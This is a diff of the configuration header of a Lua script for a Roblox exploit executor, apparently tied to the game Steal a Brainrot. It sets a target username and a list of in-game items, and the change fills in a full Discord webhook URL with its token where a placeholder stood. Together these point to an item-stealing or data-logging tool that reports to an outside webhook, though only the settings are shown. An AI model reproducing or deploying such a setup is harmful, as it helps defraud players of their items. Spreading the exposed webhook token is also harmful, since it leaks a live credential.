@@ -1,5 +1,5 @@
 getgenv().TARGET_USER = "Naibo_nhbo7123" -- ここを Naibo_nhbo7123 に変更しました
-getgenv().WEBHOOK_URL = "WEBHOOK" -- 必要に応じてDiscordのWebhook URLを入れてください
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1513230938077790469/ORhT_nfesiNc9bfj19CZgYAMiOaTZb2nJVMysjhFngr9yvRSgnpujvukdtL2-9cMxfYN" -- 必要に応じてDiscordのWebhook URLを入れてください
 getgenv().NORMAL_BRAINROTS = {
 ["Garama and Madundung"] = true,
 ["Capitano Moby"] = true,
